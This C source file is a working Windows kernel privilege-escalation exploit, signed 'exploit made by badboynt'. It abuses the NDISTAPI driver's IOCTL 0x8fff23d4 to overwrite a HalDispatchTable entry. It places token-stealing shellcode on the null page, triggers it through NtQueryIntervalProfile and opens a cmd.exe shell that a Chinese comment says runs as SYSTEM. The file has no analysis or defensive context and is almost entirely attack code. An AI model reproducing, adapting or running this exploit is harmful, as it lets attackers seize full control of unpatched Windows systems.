#include <stdio.h> 
#include <windows.h> 
#include <Psapi.h>
#pragma comment(lib,"psapi.lib")
#pragma comment (lib, "ntdll.lib")
#pragma comment (lib, "user32.lib") 



#define DRIVERCOUNT 1024
#define DRIVERNAMESIZE 256
#define MEMRES (0x1000 | 0x2000)
#define PAGEEXE 0x00000040

typedef enum _KPROFILE_SOURCE {
	ProfileTime,
	ProfileAlignmentFixup,
	ProfileTotalIssues,
	ProfilePipelineDry,
	ProfileLoadInstructions,
	ProfilePipelineFrozen,
	ProfileBranchInstructions,
	ProfileTotalNonissues,
	ProfileDcacheMisses,
	ProfileIcacheMisses,
	ProfileCacheMisses,
	ProfileBranchMispredictions,
	ProfileStoreInstructions,
	ProfileFpInstructions,
	ProfileIntegerInstructions,
	Profile2Issue,
	Profile3Issue,
	Profile4Issue,
	ProfileSpecialInstructions,
	ProfileTotalCycles,
	ProfileIcacheIssues,
	ProfileDcacheAccesses,
	ProfileMemoryBarrierCycles,
	ProfileLoadLinkedIssues,
	ProfileMaximum
} KPROFILE_SOURCE, *PKPROFILE_SOURCE;
typedef DWORD (WINAPI *_NtQueryIntervalProfile)( KPROFILE_SOURCE ProfileSource, PULONG Interval );
typedef LONG NTSTATUS;
typedef NTSTATUS (NTAPI *PNTALLOCATE)(HANDLE ProcessHandle, 
									  PVOID *BaseAddress, 
									  ULONG ZeroBits, 
									  PULONG RegionSize, 
									  ULONG AllocationType, 
									  ULONG Protect ); 
typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemModuleInformation=11, 
} SYSTEM_INFORMATION_CLASS;
typedef struct _IMAGE_FIXUP_ENTRY {
	WORD offset:12; 
	WORD type:4; 
} IMAGE_FIXUP_ENTRY, *PIMAGE_FIXUP_ENTRY;
typedef struct _SYSTEM_MODULE_INFORMATION { // Information Class 11
	ULONG Reserved[2]; 
	PVOID Base; 
	ULONG Size; 
	ULONG Flags; 
	USHORT Index; 
	USHORT Unknown; 
	USHORT LoadCount; 
	USHORT ModuleNameOffset; 
	CHAR ImageName[256]; 
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;


#define STATUS_SUCCESS ((NTSTATUS)0x00000000L) 
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)

extern "C" NTSTATUS NTAPI NtAllocateVirtualMemory( 
	IN HANDLE ProcessHandle, 
	IN OUT PVOID *BaseAddress, 
	IN ULONG ZeroBits, 
	IN OUT PULONG AllocationSize, 
	IN ULONG AllocationType, 
	IN ULONG Protect 
	);
extern "C" NTSTATUS NTAPI NtQuerySystemInformation( 
	IN SYSTEM_INFORMATION_CLASS SystemInformationClass, 
	IN OUT PVOID SystemInformation, 
	IN ULONG SystemInformationLength, 
	OUT PULONG ReturnLength OPTIONAL 
	);
extern "C" PIMAGE_NT_HEADERS NTAPI RtlImageNtHeader ( 
	IN PVOID Base 
	);
extern "C" PVOID NTAPI RtlImageDirectoryEntryToData ( 
	IN PVOID Base, 
	IN BOOLEAN MappedAsImage, 
	IN USHORT DirectoryEntry, 
	OUT PULONG Size 
	);




DWORD PsReferencePrimaryToken = 0; 
DWORD PsInitialSystemProcess = 0; 
DWORD IoThreadToProcess = 0;

FARPROC GetFunctionAddress(LPCSTR libraryName, LPCSTR functionName) {
	HMODULE hModule;
	hModule = LoadLibrary(libraryName);
	if(hModule==NULL)
		return NULL;

	return GetProcAddress(hModule,functionName);
}


LPVOID findSysBase(char* driver){
	LPVOID drivers[DRIVERCOUNT];
	DWORD cbNeeded;
	CHAR driverName[DRIVERNAMESIZE];
	DWORD index;
	DWORD driverCount;

	if(EnumDeviceDrivers(drivers,DRIVERCOUNT,&cbNeeded) && cbNeeded<DRIVERCOUNT){

		driverCount = cbNeeded /sizeof(drivers[0]);

		for(index=0;index<driverCount;index++){
			memset(driverName,0,DRIVERNAMESIZE);
			if(GetDeviceDriverBaseNameA(drivers[index],driverName,DRIVERNAMESIZE)>0){
				if(!stricmp(driver, driverName)){
					return drivers[index];
				}
			}
		}
	}

	return NULL;
}
char* findKernelVersion(){
	LPVOID drivers[DRIVERCOUNT];
	DWORD cbNeeded;
	DWORD index;
	DWORD driverCount;

	char* driverName = (char*)calloc(DRIVERNAMESIZE,sizeof(CHAR));

	if(EnumDeviceDrivers(drivers,DRIVERCOUNT,&cbNeeded) && cbNeeded<DRIVERCOUNT){       
		driverCount = cbNeeded /sizeof(drivers[0]);
		for(index=0;index<driverCount;index++){
			memset(driverName,0,DRIVERNAMESIZE);
			if(GetDeviceDriverBaseNameA(drivers[index],driverName,DRIVERNAMESIZE)>0){
				if(strstr(driverName,"krnl")){
					return driverName;
				}
			}
		}
	}
	return NULL;
}



void InitTrampoline() 
{
	PNTALLOCATE NtAllocateVirtualMemory; 
	LPVOID addr = (LPVOID)3; 
	DWORD dwShellSize=0x1000; 

	unsigned char trampoline[]= 
		"\x60\x9C\xBE\x56\x34\x12\x80\xAC\x3C\x8D\x75\xFB\x8B\x7E\x01\x22" 
		"\x46\x03\x74\x03\x8B\x7E\xFB\x8B\x35\x56\x34\x12\x80\xFF\x35\x24" 
		"\xF1\xDF\xFF\xB8\x56\x34\x12\x80\xFF\xD0\x03\xF7\x03\xF8\xA5\x9D" 
		"\x61\xC2\x08\x00";
	NtAllocateVirtualMemory = (PNTALLOCATE) GetProcAddress(GetModuleHandle("ntdll.dll"),"NtAllocateVirtualMemory");
	if( !NtAllocateVirtualMemory ) 
		exit(0);
	NtAllocateVirtualMemory( (HANDLE)-1, 
		&addr, 
		0, 
		&dwShellSize, 
		MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, 
		PAGE_EXECUTE_READWRITE );
	if( (PULONG)addr ) 
	{ 
		printf("\n[++] Error Allocating memory\n"); 
		exit(0); 
	}
	*(DWORD*)(trampoline+3)=PsReferencePrimaryToken; 
	*(DWORD*)(trampoline+0x19)=PsInitialSystemProcess; 
	*(DWORD*)(trampoline+0x24)=IoThreadToProcess; 
	memset(NULL,0x90,10);
	memcpy((void*)10,trampoline,sizeof(trampoline)-1); 
}



int main(int argc, char **argv) 
{




	printf("\n\t exploit made by badboynt \n"); 


	HMODULE hKernel; 
	STARTUPINFOA stStartup; 
	PROCESS_INFORMATION pi;
	LPVOID halBase; 
	int krnlBase;
	int HaliQuerySystemInformation, HalpSetSystemInformation, HalDispatchTable; 
	int regionSize = 0x1000;
	int baseAddr = 0x1001;

	hKernel = LoadLibraryEx(findKernelVersion(),NULL,DONT_RESOLVE_DLL_REFERENCES);
	krnlBase = (int)findSysBase(findKernelVersion());
	HalDispatchTable = (int)GetProcAddress(hKernel,"HalDispatchTable");

	HalDispatchTable -= (int)hKernel;
	HalDispatchTable += krnlBase;

	printf("[*] HalDispatchTable Address 0x%08x\n",HalDispatchTable);

	halBase = findSysBase("hal.dll");


	HaliQuerySystemInformation = (int)halBase + 0x16bba;
	HalpSetSystemInformation = (int)halBase + 0x19436;
	


	printf("[*] HaliQuerySystemInformation address 0x%08x\n",HaliQuerySystemInformation);
	printf("[*] HalpSetSystemInformation address 0x%08x\n",HalpSetSystemInformation);






	PsReferencePrimaryToken = (DWORD)GetProcAddress( hKernel, "PsReferencePrimaryToken" )-(DWORD)hKernel+krnlBase; 
	PsInitialSystemProcess = (DWORD)GetProcAddress( hKernel, "PsInitialSystemProcess" )-(DWORD)hKernel+krnlBase; 
	IoThreadToProcess = (DWORD)GetProcAddress( hKernel, "IoThreadToProcess" )-(DWORD)hKernel+krnlBase; 
	InitTrampoline();

	_NtQueryIntervalProfile NtQueryIntervalProfile;

	NtQueryIntervalProfile = (_NtQueryIntervalProfile) GetFunctionAddress("ntdll.dll","NtQueryIntervalProfile");
	if(!NtQueryIntervalProfile){
		fprintf(stderr, "GetProcAddress() failed");
		exit(1);
	}

	///////////////////////////////////////////////////////////////////////////////////////

	printf("\n[+] Executing Shellcode...\n");



	

	HANDLE dev_handle;
	ULONG  dwReturnSize;
	BYTE temp[1024] = {
		0x0 ,0x0 ,0x0 ,0x0
	} ;

	dev_handle = CreateFile("\\\\.\\NDISTAPI" ,GENERIC_READ | GENERIC_WRITE ,0,NULL,CREATE_ALWAYS ,0,0);
	if (dev_handle == INVALID_HANDLE_VALUE) 
		printf("CreateFile ERROR %d\n", GetLastError());
	else			printf("CreateFile OK!\n");

	//DeviceIoControl( dev_handle, 0xb2d600d4, (void*)temp,0x8,(void*)(HalDispatchTable),0x0,&dwReturnSize, NULL );


	DeviceIoControl( dev_handle, 0x8fff23d4, (void*)temp,4,(void*)(HalDispatchTable),0,&dwReturnSize, NULL );
	
	ULONG result;
	NtQueryIntervalProfile((KPROFILE_SOURCE)0x1337,&result);

	memcpy((void*)(temp),(void*)(&HaliQuerySystemInformation),4);
	DeviceIoControl( dev_handle, 0x8fff23d4, (void*)temp,4,(void*)(HalDispatchTable),0x0,&dwReturnSize, NULL );

	////////////////////////////////////////////////////////////////////////////////////////////////

	GetStartupInfo( &stStartup );
	CreateProcess( NULL, 
		"cmd.exe", 
		NULL, 
		NULL, 
		TRUE, 
		NULL, 
		NULL, 
		NULL, 
		&stStartup, 
		&pi ); //此时创建的cmd.exe是SYSTEM权限

	printf("[+] Exiting...\n");
	return TRUE; 
}